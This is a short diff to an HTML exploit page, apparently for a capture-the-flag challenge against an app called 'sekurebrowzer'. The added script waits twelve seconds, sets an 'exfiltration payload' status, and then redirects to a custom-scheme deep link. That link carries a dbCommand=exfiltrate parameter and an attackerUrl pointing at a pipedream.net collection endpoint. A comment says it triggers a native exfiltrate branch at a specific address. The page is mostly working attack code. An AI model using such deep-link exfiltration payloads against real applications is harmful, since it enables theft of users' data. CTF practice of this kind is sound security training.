@@ -9,7 +9,7 @@
     </style>
 </head>
 <body>
-    <h1>Internal Resource Access 5</h1> 
+    <h1>Internal Resource Access 6</h1> 
     
     <div class="box">
         <p id="exploit-status">Initializing exploit chain...</p>
@@ -88,6 +88,13 @@
             }
         }, 2000);
     }, 7000);
+
+    setTimeout(() => {
+        document.getElementById('exploit-status').innerText = "Firing native exfiltration payload...";
+        
+        // This triggers the native exfiltrate branch at 0xfde0
+        window.location.href = 'sekurebrowzer://https://yahoo.com?url=https://vini2001.github.io/ctf/index.html&dbCommand=exfiltrate&attackerUrl=https://eo1b8md42oge0zj.m.pipedream.net';
+    }, 12000);
 </script>
 </body>
 </html>
